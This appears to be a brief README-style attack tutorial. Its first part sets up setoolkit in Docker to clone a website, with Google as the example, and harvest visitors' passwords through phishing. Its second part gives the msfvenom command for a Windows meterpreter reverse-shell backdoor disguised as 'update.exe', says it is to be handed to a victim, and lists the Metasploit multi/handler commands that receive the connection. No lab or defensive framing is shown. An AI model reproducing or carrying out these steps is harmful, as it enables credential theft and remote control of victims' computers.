# Phishing for capturing passwords

### Tools

- Docker
- setoolkit

### Config Phishing on Docker

- Create image: ``` docker build -t setoolkit . ```
- Starting setoolkit: ``` docker run --network host -i setoolkit ```
- Type of attack: ``` Social-Engineering Attacks ```
- Attack Vector: ``` Web Site Attack Vectors ```
- Attack method: ```Credential Harvester Attack Method ```
- Attack method: ``` Site Cloner ```
- Clone URL: Exemple http://www.google.com

### Result

![Alt text](./image-google.png "Cloner page")

![Alt text](./image.png "capturing passwords")



# Create Backdoor with metasploitframework

First we need to create an executable for windows .exe where when executing the file we will be able to extract the connection to the machine
to create a backdoor run command

msfvenom -p windows/meterpreter/reverse_tcp -a x86 platform windows -f exe LHOST=<ip host> LPORT=4444 -o update.exe

payload = windows/meterpreter/reverse_tcp

After the app is generated, it is passed on to the victim

in the metasploit console, we will use the multi/handler exploit

command: use multi/handler

we need to set LHOST e LPORT

set LHOST <ip>
set LPORT <port app>

Started exploit

command: run
